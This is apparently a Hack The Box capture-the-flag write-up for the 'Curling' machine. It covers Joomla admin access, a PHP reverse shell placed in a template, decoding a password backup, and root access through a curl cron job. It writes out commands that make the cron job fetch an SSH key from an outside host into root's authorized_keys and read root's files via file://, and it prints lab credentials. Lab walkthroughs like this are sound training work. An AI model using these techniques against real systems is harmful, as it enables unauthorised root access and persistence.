---
title: "Hack The Box - Curling"
tags: [linux,easy,joomla , gzip , tar , bzip , bzip2 , cronjob , curl cronjob , RFI , LFI]
categories: HackTheBox-Linux
---

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled.png)

## NMAP

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%201.png)

## Web Enumeration

⇒ We see that its running joomla. After running gobuster we find an interesting text file secret.txt 

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%202.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%202.png)

→ We got an base64 encoded string on [http://10.10.10.150/secret.txt](http://10.10.10.150/secret.txt)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%203.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%203.png)

Password : **`Curling2018!`**

⇒ We found username looking at posts on joomla :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%204.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%204.png)

Username : **`Floris`**

⇒ We logged in as user Floris on administrator panel

### Exploiting Joomla to get shell

⇒ We will edit the index.php file in templates to php-reverse-shell :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%205.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%205.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%206.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%206.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%207.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%207.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%208.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%208.png)

---

## Privilege Escalation to User

⇒ In floris user home directory we find an file named password_backup which look like hex bytes.

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%209.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%209.png)

→ Using xxd to assemble it back :

**xxd -r password_backup > /tmp/output**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%2010.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%2010.png)

→ Decompressing the bzip2 file :

**bzip2 -d output**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%2011.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%2011.png)

→ Decompressing the gzip file :

**gzip -d output.out**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%2012.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%2012.png)

**bzip2 -d output**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%2013.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%2013.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%2014.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%2014.png)

→ We got credentials for user floris :

**`floris : 5d<wdCbdZu)|hChXll`**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%2015.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%2015.png)

---

## Privilege Escalation to Root

⇒ After running pspy we see there's an cronjob running curl 

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%2016.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%2016.png)

→ We see that its runs curl on the url given in the **`input`** file in **`url`** variable.

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%2017.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%2017.png)

### Exploiting curl cronjob

⇒ **Method 1** : Writing our ssh pub keys to authorized_keys of root user :

→ We edit the script so that it fetches our public key and saves the output in /root/.ssh/authorized_keys 

**`echo -ne 'output = "/root/.ssh/authorized_keys"\nurl = "[http://10.10.14.5/authorized_keys](http://10.10.14.5/authorized_keys)"\n' > input`**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%2018.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%2018.png)

→ After that we just ssh in as root :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%2019.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%2019.png)

⇒ **Method 2** : Reading the root flag

**`echo 'url = "file:///root/root.txt"' > input`**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%2020.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Curling%20Box%2068fd94c8eba74753a92f26e53f09b15a/Untitled%2020.png)

